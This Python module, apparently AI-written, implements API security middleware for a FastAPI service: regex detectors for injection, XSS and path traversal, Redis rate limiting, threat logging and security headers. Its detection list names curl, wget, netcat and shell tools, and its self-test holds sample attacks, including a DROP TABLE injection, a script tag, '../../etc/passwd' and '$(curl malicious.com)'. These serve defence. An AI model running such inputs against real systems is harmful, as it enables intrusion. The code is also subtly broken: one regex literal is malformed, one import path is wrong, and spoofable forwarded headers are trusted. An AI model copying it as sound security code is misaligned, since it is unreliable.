#!/usr/bin/env python3
"""
🛡️ API Security Framework for vLLM Enterprise Swarm

This module implements comprehensive API security including:
- Advanced rate limiting with distributed algorithms
- Input validation and sanitization
- SQL injection and XSS prevention
- API threat detection and response
- DDoS protection and traffic shaping
- Request/response inspection
- Security headers enforcement
- API key management and rotation

Security Level: Maximum Enterprise
Agent: security-architect-001
Threat Protection: OWASP API Security Top 10
"""

import asyncio
import hashlib
import hmac
import json
import logging
import re
import secrets
import time
import uuid
from datetime import datetime, timedelta
from enum import Enum
from typing import Dict, List, Optional, Set, Any, Tuple, Union, Pattern
from dataclasses import dataclass, asdict
import ipaddress

import aiohttp
from fastapi import Request, Response, HTTPException, status
from fastapi.middleware.base import BaseHTTPMiddleware
from starlette.responses import JSONResponse
import redis.asyncio as redis
from sqlalchemy.sql import text as sql_text
import bleach
from urllib.parse import unquote, quote
import user_agents

# Configure API security logging
api_security_logger = logging.getLogger('api_security.system')
threat_logger = logging.getLogger('api_security.threats')
rate_limit_logger = logging.getLogger('api_security.rate_limit')
input_validation_logger = logging.getLogger('api_security.validation')

class ThreatType(Enum):
    """Types of API threats"""
    RATE_LIMIT_EXCEEDED = "rate_limit_exceeded"
    SQL_INJECTION = "sql_injection"
    XSS_ATTEMPT = "xss_attempt"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    MALICIOUS_PAYLOAD = "malicious_payload"
    BRUTE_FORCE = "brute_force"
    DDOS_ATTACK = "ddos_attack"
    SUSPICIOUS_PATTERN = "suspicious_pattern"
    INVALID_INPUT = "invalid_input"

class SecurityAction(Enum):
    """Security response actions"""
    ALLOW = "allow"
    WARN = "warn"
    BLOCK = "block"
    CHALLENGE = "challenge"
    BAN = "ban"
    CAPTCHA = "captcha"

class RateLimitAlgorithm(Enum):
    """Rate limiting algorithms"""
    FIXED_WINDOW = "fixed_window"
    SLIDING_WINDOW = "sliding_window"
    TOKEN_BUCKET = "token_bucket"
    LEAKY_BUCKET = "leaky_bucket"

@dataclass
class SecurityThreat:
    """Detected security threat"""
    threat_id: str
    threat_type: ThreatType
    severity: str  # low, medium, high, critical
    ip_address: str
    user_agent: str
    request_path: str
    request_method: str
    payload: Optional[str]
    detection_time: datetime
    risk_score: float
    indicators: List[str]
    action_taken: SecurityAction

@dataclass
class RateLimitRule:
    """Rate limiting rule configuration"""
    name: str
    algorithm: RateLimitAlgorithm
    requests_per_window: int
    window_size_seconds: int
    burst_limit: Optional[int]
    scope: str  # ip, user, api_key, endpoint
    endpoints: List[str]
    enabled: bool

@dataclass
class APIKeyMetadata:
    """Enhanced API key metadata"""
    key_id: str
    user_id: str
    key_prefix: str
    permissions: List[str]
    rate_limits: Dict[str, int]
    allowed_ips: List[str]
    allowed_origins: List[str]
    expires_at: Optional[datetime]
    created_at: datetime
    last_used: Optional[datetime]
    usage_count: int
    is_active: bool

class InputValidator:
    """Advanced input validation and sanitization"""
    
    def __init__(self):
        # SQL injection patterns
        self.sql_patterns = [
            re.compile(r"(\b(union|select|insert|update|delete|drop|create|alter|exec|execute)\b)", re.IGNORECASE),
            re.compile(r"(\b(or|and)\b\s+\d+\s*=\s*\d+)", re.IGNORECASE),
            re.compile(r"('|\";|--|/\*|\*/)", re.IGNORECASE),
            re.compile(r"(\b(information_schema|sys\.)\b)", re.IGNORECASE),
        ]
        
        # XSS patterns
        self.xss_patterns = [
            re.compile(r"<\s*script[^>]*>", re.IGNORECASE),
            re.compile(r"javascript:", re.IGNORECASE),
            re.compile(r"on\w+\s*=", re.IGNORECASE),
            re.compile(r"<\s*iframe[^>]*>", re.IGNORECASE),
            re.compile(r"<\s*object[^>]*>", re.IGNORECASE),
            re.compile(r"<\s*embed[^>]*>", re.IGNORECASE),
        ]
        
        # Command injection patterns
        self.command_patterns = [
            re.compile(r"[;&|`$(){}[\]<>]"),
            re.compile(r"\b(curl|wget|nc|netcat|bash|sh|cmd|powershell)\b", re.IGNORECASE),
        ]
        
        # Path traversal patterns
        self.path_traversal_patterns = [
            re.compile(r"\.\.\/"),
            re.compile(r"\.\.\\\"),
            re.compile(r"%2e%2e%2f", re.IGNORECASE),
            re.compile(r"%2e%2e%5c", re.IGNORECASE),
        ]
        
        # Malicious payload patterns
        self.malicious_patterns = [
            re.compile(r"<\?php", re.IGNORECASE),
            re.compile(r"<%.*%>"),
            re.compile(r"#{.*}"),
            re.compile(r"\$\{.*\}"),
        ]
    
    def validate_input(self, input_data: Any, field_name: str = "unknown") -> Tuple[bool, List[str]]:
        """Validate input for security threats"""
        threats = []
        
        if isinstance(input_data, str):
            # Decode URL-encoded input
            decoded_input = unquote(input_data)
            
            # Check for SQL injection
            if self._check_sql_injection(decoded_input):
                threats.append(f"SQL injection attempt in {field_name}")
            
            # Check for XSS
            if self._check_xss(decoded_input):
                threats.append(f"XSS attempt in {field_name}")
            
            # Check for command injection
            if self._check_command_injection(decoded_input):
                threats.append(f"Command injection attempt in {field_name}")
            
            # Check for path traversal
            if self._check_path_traversal(decoded_input):
                threats.append(f"Path traversal attempt in {field_name}")
            
            # Check for malicious payloads
            if self._check_malicious_payload(decoded_input):
                threats.append(f"Malicious payload in {field_name}")
        
        elif isinstance(input_data, dict):
            # Recursively validate dictionary values
            for key, value in input_data.items():
                is_valid, sub_threats = self.validate_input(value, f"{field_name}.{key}")
                threats.extend(sub_threats)
        
        elif isinstance(input_data, list):
            # Validate list items
            for i, item in enumerate(input_data):
                is_valid, sub_threats = self.validate_input(item, f"{field_name}[{i}]")
                threats.extend(sub_threats)
        
        is_safe = len(threats) == 0
        return is_safe, threats
    
    def _check_sql_injection(self, input_str: str) -> bool:
        """Check for SQL injection patterns"""
        return any(pattern.search(input_str) for pattern in self.sql_patterns)
    
    def _check_xss(self, input_str: str) -> bool:
        """Check for XSS patterns"""
        return any(pattern.search(input_str) for pattern in self.xss_patterns)
    
    def _check_command_injection(self, input_str: str) -> bool:
        """Check for command injection patterns"""
        return any(pattern.search(input_str) for pattern in self.command_patterns)
    
    def _check_path_traversal(self, input_str: str) -> bool:
        """Check for path traversal patterns"""
        return any(pattern.search(input_str) for pattern in self.path_traversal_patterns)
    
    def _check_malicious_payload(self, input_str: str) -> bool:
        """Check for malicious payload patterns"""
        return any(pattern.search(input_str) for pattern in self.malicious_patterns)
    
    def sanitize_input(self, input_data: str) -> str:
        """Sanitize input string"""
        # Use bleach for HTML sanitization
        sanitized = bleach.clean(input_data, tags=[], attributes={}, strip=True)
        
        # Additional sanitization
        sanitized = sanitized.replace('\x00', '')  # Remove null bytes
        sanitized = re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]', '', sanitized)  # Remove control characters
        
        return sanitized

class AdvancedRateLimiter:
    """Advanced distributed rate limiting"""
    
    def __init__(self, redis_client):
        self.redis_client = redis_client
        self.rules: List[RateLimitRule] = []
        self.default_rules = self._create_default_rules()
        
    def _create_default_rules(self) -> List[RateLimitRule]:
        """Create default rate limiting rules"""
        return [
            RateLimitRule(
                name="general_api_limit",
                algorithm=RateLimitAlgorithm.SLIDING_WINDOW,
                requests_per_window=1000,
                window_size_seconds=3600,  # 1 hour
                burst_limit=100,
                scope="ip",
                endpoints=["*"],
                enabled=True
            ),
            RateLimitRule(
                name="auth_endpoint_limit",
                algorithm=RateLimitAlgorithm.FIXED_WINDOW,
                requests_per_window=5,
                window_size_seconds=60,  # 1 minute
                burst_limit=None,
                scope="ip",
                endpoints=["/auth/login", "/auth/register"],
                enabled=True
            ),
            RateLimitRule(
                name="user_api_limit",
                algorithm=RateLimitAlgorithm.TOKEN_BUCKET,
                requests_per_window=10000,
                window_size_seconds=3600,  # 1 hour
                burst_limit=500,
                scope="user",
                endpoints=["*"],
                enabled=True
            ),
            RateLimitRule(
                name="high_cost_operations",
                algorithm=RateLimitAlgorithm.LEAKY_BUCKET,
                requests_per_window=10,
                window_size_seconds=60,  # 1 minute
                burst_limit=5,
                scope="user",
                endpoints=["/tasks", "/agents/query"],
                enabled=True
            )
        ]
    
    async def check_rate_limit(
        self, 
        request: Request, 
        user_id: Optional[str] = None,
        api_key_id: Optional[str] = None
    ) -> Tuple[bool, Dict[str, Any]]:
        """Check if request is within rate limits"""
        
        ip_address = self._get_client_ip(request)
        endpoint = request.url.path
        
        # Check all applicable rules
        for rule in self.default_rules + self.rules:
            if not rule.enabled:
                continue
            
            # Check if rule applies to this endpoint
            if not self._rule_applies(rule, endpoint):
                continue
            
            # Determine identifier based on scope
            identifier = self._get_identifier(rule.scope, ip_address, user_id, api_key_id)
            if not identifier:
                continue
            
            # Check rate limit for this rule
            allowed, remaining, reset_time = await self._check_algorithm(rule, identifier)
            
            if not allowed:
                rate_limit_logger.warning(
                    f"Rate limit exceeded: {rule.name} for {identifier} "
                    f"on endpoint {endpoint}"
                )
                
                return False, {
                    'rule': rule.name,
                    'scope': rule.scope,
                    'limit': rule.requests_per_window,
                    'window_seconds': rule.window_size_seconds,
                    'remaining': remaining,
                    'reset_time': reset_time,
                    'retry_after': reset_time - int(time.time())
                }
        
        return True, {}
    
    async def _check_algorithm(
        self, 
        rule: RateLimitRule, 
        identifier: str
    ) -> Tuple[bool, int, int]:
        """Check rate limit using specified algorithm"""
        
        if rule.algorithm == RateLimitAlgorithm.FIXED_WINDOW:
            return await self._fixed_window(rule, identifier)
        elif rule.algorithm == RateLimitAlgorithm.SLIDING_WINDOW:
            return await self._sliding_window(rule, identifier)
        elif rule.algorithm == RateLimitAlgorithm.TOKEN_BUCKET:
            return await self._token_bucket(rule, identifier)
        elif rule.algorithm == RateLimitAlgorithm.LEAKY_BUCKET:
            return await self._leaky_bucket(rule, identifier)
        else:
            return True, rule.requests_per_window, 0
    
    async def _fixed_window(
        self, 
        rule: RateLimitRule, 
        identifier: str
    ) -> Tuple[bool, int, int]:
        """Fixed window rate limiting"""
        current_time = int(time.time())
        window_start = (current_time // rule.window_size_seconds) * rule.window_size_seconds
        key = f"rate_limit:fixed:{rule.name}:{identifier}:{window_start}"
        
        # Get current count
        count = await self.redis_client.get(key)
        current_count = int(count) if count else 0
        
        if current_count >= rule.requests_per_window:
            reset_time = window_start + rule.window_size_seconds
            return False, 0, reset_time
        
        # Increment counter
        pipe = self.redis_client.pipeline()
        pipe.incr(key)
        pipe.expire(key, rule.window_size_seconds)
        await pipe.execute()
        
        remaining = rule.requests_per_window - (current_count + 1)
        reset_time = window_start + rule.window_size_seconds
        
        return True, remaining, reset_time
    
    async def _sliding_window(
        self, 
        rule: RateLimitRule, 
        identifier: str
    ) -> Tuple[bool, int, int]:
        """Sliding window rate limiting"""
        current_time = int(time.time())
        window_start = current_time - rule.window_size_seconds
        key = f"rate_limit:sliding:{rule.name}:{identifier}"
        
        # Remove expired entries and count current entries
        pipe = self.redis_client.pipeline()
        pipe.zremrangebyscore(key, 0, window_start)
        pipe.zcard(key)
        pipe.expire(key, rule.window_size_seconds)
        results = await pipe.execute()
        
        current_count = results[1]
        
        if current_count >= rule.requests_per_window:
            reset_time = current_time + rule.window_size_seconds
            return False, 0, reset_time
        
        # Add current request
        await self.redis_client.zadd(key, {str(uuid.uuid4()): current_time})
        
        remaining = rule.requests_per_window - (current_count + 1)
        reset_time = current_time + rule.window_size_seconds
        
        return True, remaining, reset_time
    
    async def _token_bucket(
        self, 
        rule: RateLimitRule, 
        identifier: str
    ) -> Tuple[bool, int, int]:
        """Token bucket rate limiting"""
        current_time = time.time()
        key = f"rate_limit:token:{rule.name}:{identifier}"
        
        # Get bucket state
        bucket_data = await self.redis_client.hgetall(key)
        
        if bucket_data:
            tokens = float(bucket_data.get(b'tokens', rule.requests_per_window))
            last_refill = float(bucket_data.get(b'last_refill', current_time))
        else:
            tokens = rule.requests_per_window
            last_refill = current_time
        
        # Calculate tokens to add
        time_passed = current_time - last_refill
        tokens_to_add = (time_passed / rule.window_size_seconds) * rule.requests_per_window
        tokens = min(rule.requests_per_window, tokens + tokens_to_add)
        
        if tokens < 1:
            # Calculate when next token will be available
            time_for_token = rule.window_size_seconds / rule.requests_per_window
            reset_time = int(current_time + time_for_token)
            return False, 0, reset_time
        
        # Consume token
        tokens -= 1
        
        # Update bucket state
        await self.redis_client.hset(key, mapping={
            'tokens': str(tokens),
            'last_refill': str(current_time)
        })
        await self.redis_client.expire(key, rule.window_size_seconds * 2)
        
        return True, int(tokens), 0
    
    async def _leaky_bucket(
        self, 
        rule: RateLimitRule, 
        identifier: str
    ) -> Tuple[bool, int, int]:
        """Leaky bucket rate limiting"""
        current_time = time.time()
        key = f"rate_limit:leaky:{rule.name}:{identifier}"
        
        # Get bucket state
        bucket_data = await self.redis_client.hgetall(key)
        
        if bucket_data:
            level = float(bucket_data.get(b'level', 0))
            last_leak = float(bucket_data.get(b'last_leak', current_time))
        else:
            level = 0
            last_leak = current_time
        
        # Calculate leaked amount
        time_passed = current_time - last_leak
        leak_rate = rule.requests_per_window / rule.window_size_seconds
        leaked = time_passed * leak_rate
        level = max(0, level - leaked)
        
        # Check if bucket is full
        bucket_capacity = rule.burst_limit or rule.requests_per_window
        if level >= bucket_capacity:
            reset_time = int(current_time + (level - bucket_capacity + 1) / leak_rate)
            return False, 0, reset_time
        
        # Add request to bucket
        level += 1
        
        # Update bucket state
        await self.redis_client.hset(key, mapping={
            'level': str(level),
            'last_leak': str(current_time)
        })
        await self.redis_client.expire(key, rule.window_size_seconds * 2)
        
        remaining = int(bucket_capacity - level)
        return True, remaining, 0
    
    def _rule_applies(self, rule: RateLimitRule, endpoint: str) -> bool:
        """Check if rule applies to endpoint"""
        if "*" in rule.endpoints:
            return True
        return endpoint in rule.endpoints
    
    def _get_identifier(
        self, 
        scope: str, 
        ip_address: str, 
        user_id: Optional[str],
        api_key_id: Optional[str]
    ) -> Optional[str]:
        """Get identifier for rate limiting scope"""
        if scope == "ip":
            return ip_address
        elif scope == "user" and user_id:
            return f"user:{user_id}"
        elif scope == "api_key" and api_key_id:
            return f"api_key:{api_key_id}"
        elif scope == "endpoint":
            return "global"
        return None
    
    def _get_client_ip(self, request: Request) -> str:
        """Extract client IP from request"""
        # Check forwarded headers
        forwarded_for = request.headers.get("x-forwarded-for")
        if forwarded_for:
            return forwarded_for.split(',')[0].strip()
        
        real_ip = request.headers.get("x-real-ip")
        if real_ip:
            return real_ip
        
        return request.client.host if request.client else "unknown"

class ThreatDetectionEngine:
    """Advanced threat detection and response"""
    
    def __init__(self, redis_client):
        self.redis_client = redis_client
        self.input_validator = InputValidator()
        self.threat_patterns = self._load_threat_patterns()
        self.reputation_cache = {}
        
    def _load_threat_patterns(self) -> Dict[str, List[Pattern]]:
        """Load threat detection patterns"""
        return {
            'bot_patterns': [
                re.compile(r'bot|crawler|spider|scraper', re.IGNORECASE),
                re.compile(r'curl|wget|http|python-requests', re.IGNORECASE),
            ],
            'attack_patterns': [
                re.compile(r'nikto|sqlmap|nessus|burp|dirb', re.IGNORECASE),
                re.compile(r'<script>|javascript:|data:|vbscript:', re.IGNORECASE),
            ],
            'suspicious_paths': [
                re.compile(r'/admin|/wp-admin|/phpmyadmin', re.IGNORECASE),
                re.compile(r'\.(php|asp|jsp|cgi)$', re.IGNORECASE),
            ]
        }
    
    async def analyze_request(self, request: Request) -> List[SecurityThreat]:
        """Analyze request for security threats"""
        threats = []
        current_time = datetime.utcnow()
        ip_address = self._get_client_ip(request)
        user_agent = request.headers.get('user-agent', '')
        
        # Analyze user agent
        if self._is_suspicious_user_agent(user_agent):
            threats.append(SecurityThreat(
                threat_id=str(uuid.uuid4()),
                threat_type=ThreatType.SUSPICIOUS_PATTERN,
                severity="medium",
                ip_address=ip_address,
                user_agent=user_agent,
                request_path=request.url.path,
                request_method=request.method,
                payload=None,
                detection_time=current_time,
                risk_score=0.5,
                indicators=["suspicious_user_agent"],
                action_taken=SecurityAction.WARN
            ))
        
        # Analyze request path
        path_threats = self._analyze_path(request.url.path, ip_address, user_agent, current_time)
        threats.extend(path_threats)
        
        # Analyze query parameters
        if request.query_params:
            query_threats = await self._analyze_query_params(
                dict(request.query_params), ip_address, user_agent, current_time
            )
            threats.extend(query_threats)
        
        # Analyze request body for POST/PUT requests
        if request.method in ['POST', 'PUT', 'PATCH']:
            try:
                body = await request.body()
                if body:
                    body_threats = await self._analyze_request_body(
                        body, ip_address, user_agent, current_time, request.url.path
                    )
                    threats.extend(body_threats)
            except Exception as e:
                threat_logger.error(f"Error analyzing request body: {e}")
        
        # Check IP reputation
        reputation_threats = await self._check_ip_reputation(ip_address, user_agent, current_time)
        threats.extend(reputation_threats)
        
        # Log detected threats
        for threat in threats:
            await self._log_threat(threat)
        
        return threats
    
    def _is_suspicious_user_agent(self, user_agent: str) -> bool:
        """Check if user agent is suspicious"""
        if not user_agent or len(user_agent) < 10:
            return True
        
        # Check against bot patterns
        for pattern in self.threat_patterns['bot_patterns']:
            if pattern.search(user_agent):
                return True
        
        # Check against attack tool patterns
        for pattern in self.threat_patterns['attack_patterns']:
            if pattern.search(user_agent):
                return True
        
        return False
    
    def _analyze_path(
        self, 
        path: str, 
        ip_address: str, 
        user_agent: str, 
        current_time: datetime
    ) -> List[SecurityThreat]:
        """Analyze request path for threats"""
        threats = []
        
        # Check for path traversal
        if self.input_validator._check_path_traversal(path):
            threats.append(SecurityThreat(
                threat_id=str(uuid.uuid4()),
                threat_type=ThreatType.PATH_TRAVERSAL,
                severity="high",
                ip_address=ip_address,
                user_agent=user_agent,
                request_path=path,
                request_method="GET",
                payload=path,
                detection_time=current_time,
                risk_score=0.8,
                indicators=["path_traversal_attempt"],
                action_taken=SecurityAction.BLOCK
            ))
        
        # Check for suspicious paths
        for pattern in self.threat_patterns['suspicious_paths']:
            if pattern.search(path):
                threats.append(SecurityThreat(
                    threat_id=str(uuid.uuid4()),
                    threat_type=ThreatType.SUSPICIOUS_PATTERN,
                    severity="medium",
                    ip_address=ip_address,
                    user_agent=user_agent,
                    request_path=path,
                    request_method="GET",
                    payload=path,
                    detection_time=current_time,
                    risk_score=0.6,
                    indicators=["suspicious_path"],
                    action_taken=SecurityAction.WARN
                ))
        
        return threats
    
    async def _analyze_query_params(
        self, 
        params: Dict[str, str], 
        ip_address: str, 
        user_agent: str, 
        current_time: datetime
    ) -> List[SecurityThreat]:
        """Analyze query parameters for threats"""
        threats = []
        
        for key, value in params.items():
            # Validate input
            is_safe, threat_indicators = self.input_validator.validate_input(value, f"query.{key}")
            
            if not is_safe:
                # Determine threat type based on indicators
                threat_type = ThreatType.INVALID_INPUT
                severity = "medium"
                risk_score = 0.5
                action = SecurityAction.WARN
                
                if any("sql injection" in indicator.lower() for indicator in threat_indicators):
                    threat_type = ThreatType.SQL_INJECTION
                    severity = "critical"
                    risk_score = 0.9
                    action = SecurityAction.BLOCK
                elif any("xss" in indicator.lower() for indicator in threat_indicators):
                    threat_type = ThreatType.XSS_ATTEMPT
                    severity = "high"
                    risk_score = 0.8
                    action = SecurityAction.BLOCK
                
                threats.append(SecurityThreat(
                    threat_id=str(uuid.uuid4()),
                    threat_type=threat_type,
                    severity=severity,
                    ip_address=ip_address,
                    user_agent=user_agent,
                    request_path="/",
                    request_method="GET",
                    payload=f"{key}={value}",
                    detection_time=current_time,
                    risk_score=risk_score,
                    indicators=threat_indicators,
                    action_taken=action
                ))
        
        return threats
    
    async def _analyze_request_body(
        self, 
        body: bytes, 
        ip_address: str, 
        user_agent: str, 
        current_time: datetime,
        path: str
    ) -> List[SecurityThreat]:
        """Analyze request body for threats"""
        threats = []
        
        try:
            # Try to decode body
            body_str = body.decode('utf-8', errors='ignore')
            
            # Check size limits (prevent DoS)
            if len(body_str) > 10 * 1024 * 1024:  # 10MB limit
                threats.append(SecurityThreat(
                    threat_id=str(uuid.uuid4()),
                    threat_type=ThreatType.DDOS_ATTACK,
                    severity="high",
                    ip_address=ip_address,
                    user_agent=user_agent,
                    request_path=path,
                    request_method="POST",
                    payload=f"Large payload: {len(body_str)} bytes",
                    detection_time=current_time,
                    risk_score=0.7,
                    indicators=["oversized_payload"],
                    action_taken=SecurityAction.BLOCK
                ))
            
            # Try to parse as JSON and validate
            try:
                json_data = json.loads(body_str)
                is_safe, threat_indicators = self.input_validator.validate_input(json_data, "body")
                
                if not is_safe:
                    threats.append(SecurityThreat(
                        threat_id=str(uuid.uuid4()),
                        threat_type=ThreatType.MALICIOUS_PAYLOAD,
                        severity="high",
                        ip_address=ip_address,
                        user_agent=user_agent,
                        request_path=path,
                        request_method="POST",
                        payload=body_str[:1000],  # First 1000 chars
                        detection_time=current_time,
                        risk_score=0.8,
                        indicators=threat_indicators,
                        action_taken=SecurityAction.BLOCK
                    ))
            except json.JSONDecodeError:
                # Not JSON, validate as string
                is_safe, threat_indicators = self.input_validator.validate_input(body_str, "body")
                
                if not is_safe:
                    threats.append(SecurityThreat(
                        threat_id=str(uuid.uuid4()),
                        threat_type=ThreatType.MALICIOUS_PAYLOAD,
                        severity="high",
                        ip_address=ip_address,
                        user_agent=user_agent,
                        request_path=path,
                        request_method="POST",
                        payload=body_str[:1000],
                        detection_time=current_time,
                        risk_score=0.8,
                        indicators=threat_indicators,
                        action_taken=SecurityAction.BLOCK
                    ))
        
        except Exception as e:
            threat_logger.error(f"Error analyzing request body: {e}")
        
        return threats
    
    async def _check_ip_reputation(
        self, 
        ip_address: str, 
        user_agent: str, 
        current_time: datetime
    ) -> List[SecurityThreat]:
        """Check IP address reputation"""
        threats = []
        
        # Check if IP is in blocklist
        is_blocked = await self.redis_client.sismember("blocked_ips", ip_address)
        if is_blocked:
            threats.append(SecurityThreat(
                threat_id=str(uuid.uuid4()),
                threat_type=ThreatType.SUSPICIOUS_PATTERN,
                severity="critical",
                ip_address=ip_address,
                user_agent=user_agent,
                request_path="/",
                request_method="ANY",
                payload=None,
                detection_time=current_time,
                risk_score=1.0,
                indicators=["blocked_ip"],
                action_taken=SecurityAction.BAN
            ))
        
        # Check recent failure count
        failure_count = await self.redis_client.get(f"failures:{ip_address}")
        if failure_count and int(failure_count) > 10:
            threats.append(SecurityThreat(
                threat_id=str(uuid.uuid4()),
                threat_type=ThreatType.BRUTE_FORCE,
                severity="high",
                ip_address=ip_address,
                user_agent=user_agent,
                request_path="/",
                request_method="ANY",
                payload=None,
                detection_time=current_time,
                risk_score=0.8,
                indicators=[f"high_failure_count_{failure_count}"],
                action_taken=SecurityAction.CHALLENGE
            ))
        
        return threats
    
    async def _log_threat(self, threat: SecurityThreat):
        """Log security threat"""
        # Store in Redis for analysis
        await self.redis_client.setex(
            f"threat:{threat.threat_id}",
            timedelta(days=30),
            json.dumps(asdict(threat), default=str)
        )
        
        # Log based on severity
        if threat.severity == "critical":
            threat_logger.critical(f"CRITICAL THREAT: {threat.threat_type.value} from {threat.ip_address}")
        elif threat.severity == "high":
            threat_logger.error(f"HIGH THREAT: {threat.threat_type.value} from {threat.ip_address}")
        elif threat.severity == "medium":
            threat_logger.warning(f"MEDIUM THREAT: {threat.threat_type.value} from {threat.ip_address}")
        else:
            threat_logger.info(f"LOW THREAT: {threat.threat_type.value} from {threat.ip_address}")
    
    def _get_client_ip(self, request: Request) -> str:
        """Extract client IP from request"""
        forwarded_for = request.headers.get("x-forwarded-for")
        if forwarded_for:
            return forwarded_for.split(',')[0].strip()
        
        real_ip = request.headers.get("x-real-ip")
        if real_ip:
            return real_ip
        
        return request.client.host if request.client else "unknown"

class SecurityHeadersMiddleware:
    """Enforce security headers"""
    
    def __init__(self):
        self.security_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            "Permissions-Policy": "geolocation=(), microphone=(), camera=()",
        }
    
    def add_security_headers(self, response: Response) -> Response:
        """Add security headers to response"""
        for header, value in self.security_headers.items():
            response.headers[header] = value
        return response

class APISecurityMiddleware(BaseHTTPMiddleware):
    """
    🛡️ Comprehensive API Security Middleware
    
    Provides enterprise-grade API security including:
    - Advanced rate limiting
    - Threat detection and prevention
    - Input validation and sanitization
    - Security headers enforcement
    - API key validation
    """
    
    def __init__(self, app, redis_url: str = "redis://redis:6379"):
        super().__init__(app)
        self.redis_client = None
        self.rate_limiter = None
        self.threat_detector = None
        self.security_headers = SecurityHeadersMiddleware()
        
        # Public endpoints that bypass some security checks
        self.public_endpoints = {"/health", "/docs", "/openapi.json"}
    
    async def initialize(self):
        """Initialize security components"""
        self.redis_client = await redis.from_url("redis://redis:6379")
        self.rate_limiter = AdvancedRateLimiter(self.redis_client)
        self.threat_detector = ThreatDetectionEngine(self.redis_client)
        
        api_security_logger.info("API Security Middleware initialized")
    
    async def dispatch(self, request: Request, call_next):
        """Process request through security pipeline"""
        
        # Initialize if not done
        if not self.redis_client:
            await self.initialize()
        
        start_time = time.time()
        
        try:
            # Skip security for public endpoints
            if request.url.path in self.public_endpoints:
                response = await call_next(request)
                return self.security_headers.add_security_headers(response)
            
            # 1. Threat Detection
            threats = await self.threat_detector.analyze_request(request)
            
            # Check if any threats require blocking
            for threat in threats:
                if threat.action_taken == SecurityAction.BLOCK:
                    api_security_logger.warning(f"Request blocked due to threat: {threat.threat_type.value}")
                    return JSONResponse(
                        status_code=status.HTTP_403_FORBIDDEN,
                        content={
                            "error": "Request blocked due to security threat",
                            "threat_id": threat.threat_id,
                            "timestamp": datetime.utcnow().isoformat()
                        }
                    )
                elif threat.action_taken == SecurityAction.BAN:
                    # Add IP to temporary ban list
                    await self.redis_client.setex(
                        f"banned:{threat.ip_address}", 
                        timedelta(hours=1), 
                        "security_threat"
                    )
                    return JSONResponse(
                        status_code=status.HTTP_403_FORBIDDEN,
                        content={
                            "error": "IP address banned due to security threats",
                            "ban_duration": "1 hour"
                        }
                    )
            
            # 2. Rate Limiting
            user_id = getattr(request.state, 'user_id', None) if hasattr(request.state, 'user_id') else None
            api_key_id = getattr(request.state, 'api_key_id', None) if hasattr(request.state, 'api_key_id') else None
            
            allowed, limit_info = await self.rate_limiter.check_rate_limit(request, user_id, api_key_id)
            
            if not allowed:
                return JSONResponse(
                    status_code=status.HTTP_429_TOO_MANY_REQUESTS,
                    content={
                        "error": "Rate limit exceeded",
                        **limit_info
                    },
                    headers={
                        "Retry-After": str(limit_info.get('retry_after', 60))
                    }
                )
            
            # 3. Process request
            response = await call_next(request)
            
            # 4. Add security headers
            response = self.security_headers.add_security_headers(response)
            
            # 5. Add rate limit headers
            if limit_info:
                response.headers["X-RateLimit-Limit"] = str(limit_info.get('limit', ''))
                response.headers["X-RateLimit-Remaining"] = str(limit_info.get('remaining', ''))
                response.headers["X-RateLimit-Reset"] = str(limit_info.get('reset_time', ''))
            
            # Log processing time
            processing_time = time.time() - start_time
            response.headers["X-Response-Time"] = f"{processing_time:.3f}s"
            
            return response
        
        except Exception as e:
            api_security_logger.error(f"Security middleware error: {e}")
            return JSONResponse(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                content={"error": "Security processing error"}
            )

# Global security instance  
api_security_middleware = APISecurityMiddleware(None)

async def initialize_api_security():
    """Initialize the API security middleware"""
    await api_security_middleware.initialize()
    api_security_logger.info("🛡️ API Security Framework ready for threat protection")

if __name__ == "__main__":
    # Test API security framework
    async def test_api_security():
        await initialize_api_security()
        
        # Test input validation
        validator = InputValidator()
        
        test_inputs = [
            "normal input",
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "$(curl malicious.com)"
        ]
        
        for test_input in test_inputs:
            is_safe, threats = validator.validate_input(test_input)
            print(f"Input: {test_input}")
            print(f"Safe: {is_safe}")
            print(f"Threats: {threats}")
            print()
    
    asyncio.run(test_api_security())